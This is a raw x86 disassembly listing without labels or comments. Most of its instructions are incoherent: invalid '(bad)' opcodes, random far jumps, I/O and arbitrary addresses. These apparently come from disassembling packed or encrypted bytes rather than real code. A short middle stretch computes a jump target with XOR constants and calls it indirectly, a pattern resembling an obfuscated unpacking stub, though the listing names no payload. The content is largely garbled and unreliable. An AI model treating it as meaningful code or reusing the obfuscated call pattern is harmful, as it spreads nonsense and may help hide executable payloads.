  40dd56:	sbb    DWORD PTR [esi-0x2c],edx
  40dd59:	inc    ecx
  40dd5a:	sub    dl,BYTE PTR [ecx+0x399982fa]
  40dd60:	xchg   cl,al
  40dd62:	fadd   QWORD PTR [eax-0x199966d3]
  40dd68:	repz mov ah,0xdf
  40dd6b:	ja     0x40dde2
  40dd6d:	jno    0x40dd47
  40dd6f:	jg     0x40dddf
  40dd71:	sbb    al,0x25
  40dd73:	aad    0xa1
  40dd75:	mov    eax,ds:0x6b8fe0a0
  40dd7a:	dec    eax
  40dd7b:	jl     0x40dd0e
  40dd7d:	dec    edx
  40dd7e:	mov    dh,0x67
  40dd80:	and    DWORD PTR [edi+0x59],0x958428c8
  40dd87:	mov    ah,0xef
  40dd89:	mov    ebx,0xf6cc7b05
  40dd8e:	in     eax,0xde
  40dd90:	inc    ecx
  40dd91:	sub    ah,ah
  40dd93:	pushf  
  40dd94:	sub    DWORD PTR ds:0x37ae7dd5,0x41
  40dd9b:	pop    edi
  40dd9c:	cmc    
  40dd9d:	gs xchg ebp,eax
  40dd9f:	cld    
  40dda0:	push   es
  40dda1:	mov    cl,0xe1
  40dda3:	adc    BYTE PTR [edx-0x79aa3a8b],0x9b
  40ddaa:	mov    esi,0xb351bf0b
  40ddaf:	push   esi
  40ddb0:	pop    es
  40ddb1:	mov    bl,0x7f
  40ddb3:	cwde   
  40ddb4:	and    edi,esi
  40ddb6:	call   0x6d0f6f8d
  40ddbb:	push   edx
  40ddbc:	test   BYTE PTR [esi],ah
  40ddbe:	sub    cl,0x90
  40ddc1:	pop    es
  40ddc2:	fnstenv [eax+0x5bb86370]
  40ddc8:	dec    edx
  40ddc9:	arpl   si,dx
  40ddcb:	pop    edx
  40ddcc:	adc    ah,BYTE PTR [edx-0x55]
  40ddcf:	sub    ebp,DWORD PTR [esi-0x19]
  40ddd2:	or     ch,BYTE PTR [esi+0x7fca2653]
  40ddd8:	dec    eax
  40ddd9:	cmp    eax,0x6e3a92fd
  40ddde:	jmp    0x907a:0x223948b4
  40dde5:	sbb    eax,0x7ac077f
  40ddea:	push   ds
  40ddeb:	aaa    
  40ddec:	(bad)  
  40dded:	xor    BYTE PTR [eax-0x72fb1051],dh
  40ddf3:	sub    eax,0xda014232
  40ddf8:	call   DWORD PTR [eax-0x53b10a62]
  40ddfe:	jg     0x40dde5
  40de00:	cli    
  40de01:	es mov ebx,0xa96bbd9a
  40de07:	fs dec esi
  40de09:	adc    DWORD PTR [edi+0x6c],ebx
  40de0c:	or     dl,BYTE PTR [edx-0x50]
  40de0f:	or     ecx,DWORD PTR [ebp-0x43]
  40de12:	push   ebx
  40de13:	(bad)
  40de17:	mov    eax,DWORD PTR [ebp-0x18]
  40de1a:	mov    edx,DWORD PTR [ebp+0x14]
  40de1d:	xor    eax,ecx
  40de1f:	add    eax,esi
  40de21:	imul   eax,DWORD PTR [edx]
  40de24:	mov    edx,DWORD PTR [ebp-0x4]
  40de27:	xor    edx,ecx
  40de29:	mov    ecx,DWORD PTR [ebp+0x8]
  40de2c:	lea    ecx,[edx+ecx*1+0x32729b]
  40de33:	cmp    ecx,eax
  40de35:	jne    0x40dc88
  40de3b:	mov    ebx,esi
  40de3d:	jmp    0x40de47
  40de42:	mov    ebx,0x32729b
  40de47:	mov    eax,DWORD PTR [ebp-0x4]
  40de4a:	xor    eax,0x7510854
  40de4f:	add    eax,ebx
  40de51:	mov    DWORD PTR [ebp-0xc],eax
  40de54:	xor    ebx,ebx
  40de56:	lea    eax,[ebp-0x10]
  40de59:	add    ebx,DWORD PTR [eax]
  40de5b:	call   ebx
  40de5d:	xor    ebx,ebx
  40de5f:	inc    ebx
  40de60:	cmp    DWORD PTR [ebp+0x10],ebx
  40de63:	je     0x40dfca
  40de69:	xchg   edx,eax
  40de6a:	push   0xa
  40de6c:	pop    ecx
  40de6d:	push   0x4
  40de6f:	pop    ebx
  40de70:	jmp    0x40dfb9
  40de75:	call   0x7013:0x71175975
  40de7c:	jno    0x40de7d
  40de7e:	ins    DWORD PTR es:[edi],dx
  40de7f:	add    BYTE PTR [edx-0x30a370ce],al
  40de85:	pop    ecx
  40de86:	xchg   esi,eax
  40de87:	jle    0x40df07
  40de89:	and    bh,BYTE PTR [edi+0x7e]
  40de8c:	jle    0x40dec6
  40de8e:	mov    ds:0x405acbd,eax
  40de93:	cld    
  40de94:	sar    cl,cl
  40de96:	rcr    DWORD PTR [eax-0x631246bf],1
  40de9c:	cmp    bh,al
  40de9e:	shl    DWORD PTR [edx+0x70f5fd98],1
  40dea4:	and    al,0x16
  40dea6:	es (bad) 
  40dea8:	stos   DWORD PTR es:[edi],eax
  40dea9:	lea    esi,[ecx+0xf45bae1]
  40deaf:	lfs    edi,FWORD PTR [edi-0x17049909]
  40deb6:	adc    dl,dh
  40deb8:	daa    
  40deb9:	sbb    eax,0xed834fa4
  40debe:	xlat   BYTE PTR ds:[ebx]
  40debf:	pop    esi
  40dec0:	retf   
  40dec1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dec2:	add    ah,BYTE PTR [edx+edi*4-0xf133ab5]
  40dec9:	or     BYTE PTR [ebx],0x44
  40decc:	aas    
  40decd:	adc    DWORD PTR [eax+0x7f],esi
  40ded0:	je     0x40dea7
  40ded2:	jmp    0x40df44
  40ded4:	repz inc edx
  40ded6:	add    ebp,esp
  40ded8:	pop    ss
  40ded9:	xchg   ebp,eax
  40deda:	dec    eax
  40dedb:	loopne 0x40df3c
  40dedd:	push   ss
  40dede:	repz push ebx
  40dee0:	pop    eax
  40dee1:	nop
  40dee2:	std    
  40dee3:	mov    eax,0x92e605
  40dee8:	dec    ebp
  40dee9:	les    esp,FWORD PTR [edi+edx*1]
  40deec:	pop    ebx
  40deed:	sti    
  40deee:	inc    edx
  40deef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40def0:	add    BYTE PTR [ebx-0x7f],dl
  40def3:	pop    ss
  40def4:	dec    ebp
  40def5:	mov    cl,0x7c
  40def7:	jmp    0x6264b5ca
  40defc:	sbb    DWORD PTR [eax],0xffffffa0
  40deff:	and    DWORD PTR [ecx-0x32],eax
  40df02:	test   eax,0x259d29f4
  40df07:	sub    BYTE PTR [edi+ebp*4],dl
  40df0a:	out    dx,eax
  40df0b:	mov    ah,0xbe
  40df0d:	cwde   
  40df0e:	stos   DWORD PTR es:[edi],eax
  40df0f:	and    eax,0xf618d480
  40df14:	xchg   ebx,eax
  40df15:	fwait
  40df16:	xor    eax,0x381041bd
  40df1b:	jb     0x40deef
  40df1d:	jo     0x40debc
  40df1f:	out    dx,eax
  40df20:	leave  
  40df21:	scas   al,BYTE PTR es:[edi]
  40df22:	xchg   cl,dl
  40df24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df25:	into   
  40df26:	mov    ebp,DWORD PTR [ecx-0x1]
  40df29:	cmp    BYTE PTR [esi-0x6337825c],al
  40df2f:	adc    cl,0xdd
  40df32:	inc    ecx
  40df33:	mov    al,ds:0xad373104
  40df38:	mov    ecx,0x9252b665
  40df3d:	push   es
  40df3e:	sti    
  40df3f:	dec    edi
  40df40:	sbb    eax,0x23084d33
  40df45:	add    bl,BYTE PTR [ecx+0x5d]
  40df48:	xchg   esi,eax
  40df49:	icebp  
  40df4a:	add    ebp,eax
  40df4c:	arpl   WORD PTR fs:[esi],bx
  40df4f:	out    0x22,eax
  40df51:	or     DWORD PTR [ebx+ebx*8-0x7a],ebx
  40df55:	fs xor eax,0x6027481
  40df5b:	arpl   WORD PTR es:[edi],bx
  40df5e:	shr    DWORD PTR [esi],0xb1
  40df61:	fdivrp st(1),st
  40df63:	pop    eax
  40df64:	push   ss
  40df65:	jl     0x40dfdf
  40df67:	mov    ecx,0xe1d79ba0
  40df6c:	add    esi,DWORD PTR [ebx-0x62]
  40df6f:	sbb    eax,0x7ae98224
  40df74:	push   cs
  40df75:	std    
  40df76:	mov    al,0x3c
  40df78:	sbb    DWORD PTR [edi+0x39],0x5bbd7ec1
  40df7f:	mov    ebx,0x18612389
  40df84:	mov    al,ds:0x5864a8a8
  40df89:	mov    esi,0xf3c00984
  40df8e:	repz popa 
  40df90:	(bad)  
  40df91:	mov    ebp,0x7d82f686
  40df96:	and    al,0x7f
  40df98:	or     eax,0x964bfbce
  40df9d:	sub    dh,dl
  40df9f:	pushf  
  40dfa0:	xchg   ecx,eax
  40dfa1:	pop    ebp
  40dfa2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dfa3:	das    
  40dfa4:	mov    ebx,0x4a29fb93
  40dfa9:	xor    dl,BYTE PTR [eax]
  40dfab:	sahf   
  40dfac:	sbb    ch,BYTE PTR [edx]
  40dfae:	shl    DWORD PTR [edi],cl
  40dfb0:	inc    ebx
  40dfb1:	pop    esi
  40dfb2:	sbb    ah,0xec
  40dfb5:	jbe    0x40df8f
  40dfb7:	and    DWORD PTR [ecx+0x2bcb8743],0xffffffd9
  40dfbe:	xchg   ebx,ecx
  40dfc0:	dec    ecx
  40dfc1:	mov    eax,DWORD PTR [ebp-0x1c]
  40dfc4:	imul   eax,ecx
  40dfc7:	add    esp,eax
  40dfc9:	xchg   edx,eax
  40dfca:	push   eax
  40dfcb:	xor    ebx,ebx
  40dfcd:	mov    edx,esp
  40dfcf:	dec    edx
  40dfd0:	inc    ebx
  40dfd1:	add    ebx,DWORD PTR [edx+ebx*1]
  40dfd4:	dec    ebx
  40dfd5:	xor    edx,edx
  40dfd7:	add    DWORD PTR [ebp-0xc],ebx
  40dfda:	pop    ebx
  40dfdb:	mov    eax,DWORD PTR [ebp-0xc]
  40dfde:	pop    edi
  40dfdf:	pop    esi
  40dfe0:	pop    ebx
  40dfe1:	leave  
  40dfe2:	ret    0x10
  40dfe5:	dec    ebp
  40dfe6:	push   ebp
  40dfe7:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  40dfed:	mov    esp,ebp
  40dfef:	or     ah,dh
  40dff1:	dec    ebp
  40dff2:	add    bh,al
  40dff4:	add    BYTE PTR [eax],cl
  40dff6:	add    BYTE PTR [eax],al
  40dff8:	mov    DWORD PTR [eax],0x40f44545
  40dffe:	xor    DWORD PTR [eax],eax
  40e000:	test   DWORD PTR [ebx-0x34070b64],ecx
  40e006:	(bad)  
  40e007:	enter  0x4d45,0xbc
  40e00b:	mov    esi,DWORD PTR [edx]
  40e00d:	hlt    
  40e00e:	test   ebx,ecx
  40e010:	pushf  
  40e011:	enter  0x4df8,0x8b
  40e015:	mov    DWORD PTR [ebp-0x20],0x890208
  40e01c:	inc    ebp
  40e01d:	inc    ebp
  40e01e:	cld    
  40e01f:	xor    cl,BYTE PTR [ebx-0xb38b300]
  40e025:	or     BYTE PTR [ebx+0x0],dl
  40e028:	mov    ebx,0x8bd5400
  40e02d:	call   DWORD PTR [ecx-0x1]
  40e030:	pop    es
  40e031:	mov    ch,0x33
  40e033:	dec    ebx
  40e035:	(bad)  
  40e036:	mov    eax,0x72009ba4
  40e03b:	push   DWORD PTR [edx]
  40e03d:	or     BYTE PTR [eax],al
  40e03f:	jmp    0xff89:0x75c84d03
  40e046:	dec    ebp
  40e047:	loopne 0x40e019
  40e049:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  40e04f:	add    BYTE PTR [ebx],dh
  40e051:	mov    ecx,ebx
  40e053:	hlt    
  40e054:	add    ecx,ebx
  40e056:	enter  0x899b,0x32
  40e05a:	dec    ebp
  40e05b:	add    ecx,eax
  40e05d:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  40e063:	or     DWORD PTR [ebx-0xb00b29c],0x0
  40e06a:	xor    ecx,ebx
  40e06c:	retf   
  40e06d:	enter  0x4d03,0xc8
  40e071:	mov    DWORD PTR fs:[eax],ebx
  40e074:	lea    eax,[eax]
  40e076:	push   esp
  40e077:	mov    edi,edi
  40e079:	fs (bad) 
  40e07b:	(bad)  
  40e07c:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  40e082:	push   0xffffffff
  40e084:	and    bh,bh
  40e086:	pop    ecx
  40e087:	inc    eax
  40e088:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  40e08e:	push   0xffffff8b
  40e090:	pop    ecx
  40e091:	cld    
  40e092:	dec    ebp
  40e093:	lea    ecx,[ecx+0x45ff08ff]
  40e099:	mov    BYTE PTR [edx+0x1],cl
  40e09c:	add    BYTE PTR [eax],al
  40e09e:	mov    DWORD PTR [ebp+0x8],0x58008d
  40e0a5:	dec    DWORD PTR [ebp-0x77]
  40e0a8:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  40e0af:	cld    
  40e0b0:	dec    ebp
  40e0b1:	jne    0x40e0e6
  40e0b3:	lea    eax,[ebx]
  40e0b5:	push   eax
  40e0b6:	mov    edi,edi
  40e0b8:	or     BYTE PTR [ecx+0x54a845],cl
  40e0be:	add    al,ch
  40e0c0:	(bad)  
  40e0c1:	sub    esp,ebp
  40e0c3:	add    BYTE PTR [eax],al
  40e0c5:	rol    BYTE PTR [eax],0x84
  40e0c8:	inc    ebp
  40e0c9:	add    dh,BYTE PTR [esi+0x0]
  40e0cc:	add    BYTE PTR [ebp-0x73],al
  40e0cf:	mov    ebp,DWORD PTR [esp+edx*4]
  40e0d2:	inc    DWORD PTR [eax]
  40e0d4:	lea    ecx,[ebx-0x30074f4]
  40e0da:	call   0x41ec5f
  40e0df:	add    BYTE PTR [ebp+0x0],cl
  40e0e2:	jne    0x40e125
  40e0e4:	dec    DWORD PTR [ebx-0x76210314]
  40e0ea:	dec    ebp
  40e0eb:	add    DWORD PTR [ebp+0x0],esi
  40e0ee:	(bad)  
  40e0ef:	xchg   ebp,eax
  40e0f0:	loopne 0x40e0f1
  40e0f2:	inc    eax
  40e0f3:	inc    DWORD PTR [eax]
  40e0f5:	mov    ecx,DWORD PTR [ebp-0x4]
  40e0f8:	xor    edx,DWORD PTR [edx+0x7201b8]
  40e0fe:	add    BYTE PTR [edx],dl
  40e100:	enter  0x4d90,0x0
  40e104:	mov    eax,DWORD PTR [eax]
  40e106:	hlt    
  40e107:	add    al,0xa5
  40e109:	mov    al,0xff
  40e10b:	add    bh,bh
  40e10d:	add    BYTE PTR [ebx],dh
  40e10f:	inc    DWORD PTR [ebx]
  40e111:	sbb    al,0x89
  40e113:	jne    0x40e0ed
  40e115:	mov    esp,DWORD PTR [ecx+0x4500fc]
  40e11b:	mov    eax,DWORD PTR [ebp-0xff0048]
  40e121:	mov    DWORD PTR [eax-0x70],0xec58ed89
  40e128:	inc    DWORD PTR [ebp-0x75]
  40e12b:	fisttp QWORD PTR [esi+ebp*8]
  40e12e:	test   DWORD PTR [esi-0x1],esp
  40e131:	inc    ebp
  40e132:	(bad)  
  40e133:	aas    
  40e134:	inc    ebp
  40e135:	(bad)  
  40e136:	lea    edi,[esp+eiz*2-0x1]
  40e13a:	inc    edi
  40e13c:	mov    DWORD PTR ds:0x8000c7a0,edi
  40e142:	mov    ebp,esp
  40e144:	cld    
  40e145:	loop   0x40e0d4
  40e147:	inc    ebp
  40e148:	(bad)  
  40e149:	out    dx,al
  40e14a:	(bad)  
  40e14b:	fisttp WORD PTR [eax+0x8801c7]
  40e151:	jecxz  0x40e198
  40e153:	in     al,dx
  40e154:	inc    DWORD PTR [ebp-0x4]
  40e157:	out    0x8d,eax
  40e159:	aas    
  40e15a:	inc    edi
  40e15c:	jmp    FWORD PTR [eax-0x78]
  40e15f:	inc    DWORD PTR [ecx]
  40e161:	mov    DWORD PTR [eax],0xc7a83d
  40e167:	ins    BYTE PTR es:[edi],dx
  40e168:	test   edi,edi
  40e16a:	pandn  mm0,mm5
  40e16d:	aas    
  40e16e:	add    bh,al
  40e170:	mov    esi,DWORD PTR [eax-0x4]
  40e173:	inc    DWORD PTR [eax+0xdf01ee]
  40e179:	(bad)  
  40e17a:	or     BYTE PTR [ebp+eax*2-0x1],dh
  40e17e:	mov    ebp,ebx
  40e180:	xchg   esp,eax
  40e181:	fild   DWORD PTR [eax]
  40e183:	(bad)  
  40e184:	mov    edi,DWORD PTR [eax+0x3]
  40e187:	(bad)  
  40e188:	cmp    al,0xe7
  40e18a:	dec    ebp
  40e18b:	leave  
  40e18c:	mov    ebp,eax
  40e18e:	fsubr  DWORD PTR [ecx]
  40e190:	add    BYTE PTR [eax],al
  40e192:	lea    ecx,[ebx-0x7f0003b4]
  40e198:	push   edx
  40e199:	add    DWORD PTR [ebp+0x0],edx
  40e19c:	mov    esi,DWORD PTR [eax]
  40e19e:	mov    WORD PTR [ebx-0x7a750000],?
  40e1a4:	add    esi,DWORD PTR [ebp-0x78]
  40e1a7:	mov    eax,DWORD PTR [eax]
  40e1a9:	cld    
  40e1aa:	push   0x7d
  40e1ac:	dec    DWORD PTR [ebx+0xd88c]
  40e1b2:	push   edx
  40e1b3:	mov    edx,DWORD PTR [ecx-0x4]
  40e1b6:	call   DWORD PTR [eax+0x7d01fc]
  40e1bc:	mov    ebx,edx
  40e1be:	cld    
  40e1bf:	add    BYTE PTR [eax+0x560150],dl
  40e1c5:	test   DWORD PTR [ebp+0x75],eax
  40e1c8:	loop   0x40e155
  40e1ca:	jmp    0xe38b:0x947dc7fc
  40e1d1:	fsub   st,st(7)
  40e1d3:	add    bh,al
  40e1d5:	mov    ebx,DWORD PTR [eax-0x7a6f8104]
  40e1db:	add    edi,edi
  40e1dd:	add    bh,bh
  40e1df:	mov    eax,0x50e600ed
  40e1e4:	inc    ebp
  40e1e5:	push   esi
  40e1e6:	fisttp WORD PTR [ebx+0x4dc7f43f]
  40e1ec:	test   BYTE PTR [ebx],dh
  40e1ee:	out    0x5,al
  40e1f0:	shl    BYTE PTR [edx+0x45],0x0
  40e1f4:	jmp    0x40e1b7
  40e1f6:	fild   DWORD PTR [edi+eax*8-0x22ff73ff]
  40e1fd:	inc    esi
  40e1fe:	jle    0x40e200
  40e200:	test   edi,eax
  40e202:	jmp    esp
  40e204:	inc    DWORD PTR [eax]
  40e206:	in     eax,dx
  40e207:	add    dh,ah
  40e209:	jne    0x40e190
  40e20b:	mov    edi,edi
  40e20d:	cld    
  40e20e:	inc    DWORD PTR [ebp-0x14]
  40e211:	mov    esp,edx
  40e213:	mov    ah,0x85
  40e215:	add    bh,bh
  40e217:	call   0x1270b1b
  40e21c:	ror    BYTE PTR [ebx-0x7f00037b],0xff
  40e223:	add    ebx,esp
  40e225:	add    ah,ch
  40e227:	xor    BYTE PTR [ebp-0xff00cf],al
  40e22d:	mov    ebx,ebp
  40e22f:	cld    
  40e230:	jle    0x40e1bb
  40e232:	or     DWORD PTR [ecx],eax
  40e234:	add    BYTE PTR [eax],al
  40e236:	push   eax
  40e237:	add    DWORD PTR [ebp+0x45],eax
  40e23a:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  40e240:	dec    DWORD PTR [ebx-0x3fda0318]
  40e246:	add    BYTE PTR [ebp-0xbf0040],dl
  40e24c:	inc    ebp
  40e24d:	or     BYTE PTR [ebx-0x4faf0400],0x45
  40e254:	add    DWORD PTR [ebx+0x459c00],ecx
  40e25a:	mov    edi,edi
  40e25c:	mov    eax,0xe80800ff
  40e261:	inc    ebp
  40e262:	sub    BYTE PTR [ebx-0x47000400],cl
  40e268:	add    al,0x1
  40e26a:	rol    BYTE PTR [eax],0x1e
  40e26d:	jne    0x40e2b4
  40e26f:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  40e275:	inc    DWORD PTR [ecx]
  40e277:	call   0x860a7c
  40e27c:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  40e282:	call   0x410a88
  40e287:	xor    bh,bh
  40e289:	push   edi
  40e28a:	adc    BYTE PTR [ebx-0x747423bb],al
  40e290:	loopne 0x40e26e
  40e292:	ret    
  40e293:	loopne 0x40e230
  40e295:	xor    DWORD PTR [edx],0x31
  40e298:	cmp    edi,edi
  40e29a:	bswap  esp
  40e29c:	rol    BYTE PTR gs:[eax],0x5
  40e2a0:	jmp    0x12be3ea
  40e2a5:	mov    eax,DWORD PTR [ebp-0x4]
  40e2a8:	add    BYTE PTR [eax+0xff0100],bh
  40e2ae:	cld    
  40e2af:	jne    0x40e32e
  40e2b1:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  40e2b7:	push   ss
  40e2b8:	add    DWORD PTR [eax],eax
  40e2ba:	add    BYTE PTR [eax+0x7f],dl
  40e2bd:	inc    ebp
  40e2be:	add    BYTE PTR [ebx+0x459850],cl
  40e2c4:	mov    edi,edi
  40e2c6:	test   al,0xff
  40e2c8:	add    BYTE PTR [eax],cl
  40e2ca:	inc    DWORD PTR [ebp-0x18]
  40e2cd:	jmp    DWORD PTR ds:0x4d7d00dc
  40e2d3:	adc    BYTE PTR [ebx+0x459cb9],cl
  40e2d9:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  40e2df:	fwait
  40e2e0:	mov    eax,0x30132
  40e2e5:	lea    esi,[ebp+0x2c]
  40e2e8:	xor    edi,edi
  40e2ea:	(bad)  
  40e2eb:	call   0x1400a58
  40e2f0:	call   0x1350b80
  40e2f5:	jne    0x40e282
  40e2f7:	xor    edi,esp
  40e2f9:	add    eax,DWORD PTR [eax+0xc018d]
  40e2ff:	push   DWORD PTR [eax]
  40e301:	call   0xca0a5d
  40e306:	int3   
  40e307:	inc    DWORD PTR [ebp-0x14]
  40e30a:	mov    ecx,DWORD PTR [ebp-0x28]
  40e30d:	xor    eax,DWORD PTR [eax]
  40e30f:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  40e315:	(bad)  
  40e316:	xchg   ebp,eax
  40e317:	in     al,0xff
  40e319:	add    bh,bh
  40e31b:	add    BYTE PTR [ebp+0x45],dl
  40e31e:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  40e324:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff65]
  40e32b:	mov    edi,edi
  40e32d:	or     BYTE PTR [eax],cl
  40e32f:	inc    ebp
  40e330:	test   DWORD PTR gs:[eax],eax
  40e333:	je     0x40e37a
  40e335:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  40e33b:	xor    edx,DWORD PTR [eax-0x73]
  40e33e:	push   ebp
  40e33f:	or     BYTE PTR [ebp+0x21007572],al
  40e345:	inc    ebp
  40e346:	in     al,dx
  40e347:	mov    ebp,DWORD PTR [eax]
  40e349:	mov    esp,0x658bc345
  40e34e:	fmul   st,st(5)
  40e350:	add    BYTE PTR [ebx],ch
  40e352:	mov    eax,DWORD PTR [ebx]
  40e354:	cld    
  40e355:	loopne 0x40e317
  40e357:	inc    ebp
  40e358:	push   ebp
  40e359:	cmp    ebp,eax
  40e35b:	movaps xmm4,XMMWORD PTR [eax-0x74740100]
  40e362:	cld    
  40e363:	fadd   DWORD PTR [eax+0x3b014d]
  40e369:	jne    0x40e39b
  40e36b:	push   0xf8898557
  40e370:	in     al,dx
  40e371:	jne    0x40e3b8
  40e373:	lea    eax,[ebx+0x72e8dcc8]
  40e379:	das    
  40e37a:	mov    eax,DWORD PTR [eax]
  40e37c:	mov    esp,0x33eb7545
  40e381:	mov    edi,DWORD PTR [edi+0x4572bc]
  40e387:	xor    eax,edi
  40e389:	adc    DWORD PTR [ebp-0xcd0065],0x8be131
  40e393:	rcl    BYTE PTR [eax-0x40],1
  40e396:	inc    ebp
  40e397:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  40e39f:	inc    ebp
  40e3a0:	xchg   ebp,eax
  40e3a1:	ud0    ebp,DWORD PTR [ebx]
  40e3a4:	inc    DWORD PTR [eax]
  40e3a6:	retf   
  40e3a7:	jbe    0x40e3a9
  40e3a9:	mov    dl,BYTE PTR [eax-0x80]
  40e3ac:	push   ebp
  40e3ad:	pop    ds
  40e3ae:	mov    ecx,DWORD PTR [esp+esi*8]
  40e3b1:	inc    eax
  40e3b2:	retf   
  40e3b3:	inc    ebp
  40e3b4:	iret   
  40e3b5:	jb     0x40e37f
  40e3b7:	mov    eax,DWORD PTR [edi]
  40e3b9:	enter  0x4545,0x1
  40e3bd:	xor    DWORD PTR [eax],eax
  40e3bf:	pushf  
  40e3c0:	mov    ecx,DWORD PTR [ecx+0x324df0bc]
  40e3c6:	xor    ebx,DWORD PTR [ebp+ecx*4+0x72e00889]
  40e3cd:	dec    ebp
  40e3ce:	add    BYTE PTR [ebx],dh
  40e3d0:	inc    ebp
  40e3d1:	mov    DWORD PTR [ebx-0x3f641b4c],ecx
  40e3d7:	xor    dl,BYTE PTR [edx]
  40e3d9:	add    eax,DWORD PTR [ebp-0x77]
  40e3dc:	mov    eax,esp
  40e3de:	fmul   DWORD PTR [ebp-0x3d]
  40e3e1:	xor    eax,DWORD PTR [ebx+eax*1+0x832899b]
  40e3e8:	mov    DWORD PTR [ebp-0x28],eax
  40e3eb:	rol    DWORD PTR [ebp-0x64],1
  40e3ee:	xor    eax,edi
  40e3f0:	mov    ecx,0xff858db0
  40e3f5:	clc    
  40e3f6:	enter  0x4d45,0x3c
  40e3fa:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  40e401:	test   esi,edi
  40e403:	clc    
  40e404:	inc    DWORD PTR [ebp+0x45]
  40e407:	mov    ebx,DWORD PTR ds:[eax+ecx*1+0x16a8c8c7]
  40e40f:	test   DWORD PTR [ecx],esi
  40e411:	clc    
  40e412:	pushf  
  40e413:	inc    ebp
  40e414:	(bad)  
  40e415:	cmp    ah,bh
  40e417:	pushf  
  40e418:	inc    ebp
  40e419:	mov    edx,DWORD PTR [eax-0x28]
  40e41c:	lock push ebp
  40e41e:	add    BYTE PTR [ebx],dh
  40e420:	mov    DWORD PTR [ebx],eax
  40e422:	sar    BYTE PTR [ebx],1
  40e424:	adc    BYTE PTR [edi],cl
  40e426:	dec    ebp
  40e427:	adc    al,0x8b
  40e429:	add    al,dl
  40e42b:	jmp    0x101e5fb
  40e430:	jb     0x40e47f
  40e432:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  40e438:	xor    ecx,DWORD PTR [ebp+0x3b]
  40e43b:	xor    ecx,DWORD PTR [edi]
  40e43d:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  40e441:	(bad)  
  40e443:	clc    
  40e444:	enter  0x8400,0x8b
  40e448:	pop    es
  40e449:	mov    al,0x0
  40e44b:	push   ebp
  40e44c:	push   cs
  40e44d:	xor    ecx,eax
  40e44f:	xor    esp,ecx
  40e451:	add    ebp,DWORD PTR [eax]
  40e453:	add    esi,DWORD PTR [eax]
  40e455:	(bad)  
  40e457:	retf   0x55c8
  40e45a:	repnz mov eax,DWORD PTR [ebp-0x10]
  40e45e:	(bad)  
  40e45f:	cli    
  40e460:	fdivr  st,st(1)
  40e462:	test   DWORD PTR [eax+edi*8],ecx
  40e465:	dec    ebp
  40e466:	inc    ebp
  40e467:	xor    edi,DWORD PTR [eax-0x7167afd]
  40e46d:	add    BYTE PTR [ebp+0x0],al
  40e470:	mov    ecx,DWORD PTR [ebp-0x28]
  40e473:	mov    ecx,ebx
  40e475:	clc    
  40e476:	jne    0x40e443
  40e478:	mov    esi,0xd672d3
  40e47d:	into   
  40e47e:	into   
  40e47f:	scas   eax,DWORD PTR es:[edi]
  40e480:	dec    ebp
  40e481:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  40e487:	sub    ecx,esi
  40e489:	cmp    ecx,DWORD PTR [ebp+0x77]
  40e48c:	(bad)  
  40e48d:	mov    edi,eax
  40e48f:	mov    al,0x85
  40e491:	mov    eax,edi
  40e493:	add    BYTE PTR [ebp-0x75],al
  40e496:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  40e49d:	xor    eax,DWORD PTR [ebp+0x4503f803]
  40e4a3:	(bad)  
  40e4a5:	retf   0x559c
  40e4a8:	(bad)  
  40e4a9:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  40e4b0:	inc    ebp
  40e4b1:	add    eax,0xeb9c4d3f
  40e4b6:	(bad)  
  40e4b7:	mov    ecx,esp
  40e4b9:	lods   al,BYTE PTR ds:[esi]
  40e4ba:	test   DWORD PTR [ebp-0x8],edx
  40e4bd:	xor    ecx,DWORD PTR [ebp+0x33]
  40e4c0:	mov    eax,DWORD PTR [ebx]
  40e4c2:	lock add ecx,ebx
  40e4c5:	bswap  esi
  40e4c7:	retf   0x55d1
  40e4ca:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  40e4d0:	jmp    0x40e4cb
  40e4d2:	add    BYTE PTR ds:0xebc44d8b,al
  40e4d8:	push   ebp
  40e4d9:	mov    ebp,DWORD PTR [ebx]
  40e4db:	test   al,0x8b
  40e4dd:	push   ebp
  40e4de:	clc    
  40e4df:	xor    ecx,ebx
  40e4e1:	xor    ecx,esi
  40e4e3:	add    edx,ecx
  40e4e5:	add    eax,DWORD PTR [edx+0xca010f]
  40e4eb:	push   ebp
  40e4ec:	dec    ebp
  40e4ed:	mov    ecx,DWORD PTR [ebx-0x34050710]
  40e4f3:	stc    
  40e4f4:	rol    DWORD PTR ds:0xebce4dd6,cl
  40e4fa:	scas   eax,DWORD PTR es:[edi]
  40e4fb:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  40e501:	xor    ebp,DWORD PTR [ebx]
  40e503:	xor    edi,DWORD PTR [ebx]
  40e505:	add    esi,DWORD PTR [edi+0x3]
  40e508:	mov    ecx,DWORD PTR [edi]
  40e50a:	clc    
  40e50b:	retf   0x55cb
  40e50e:	into   
  40e50f:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  40e516:	mov    eax,0x3376554d
  40e51b:	mov    esi,DWORD PTR [ebx]
  40e51d:	int3   
  40e51e:	add    edx,DWORD PTR [ebp+0x3]
  40e521:	xor    ecx,DWORD PTR [edi]
  40e523:	xor    ecx,edx
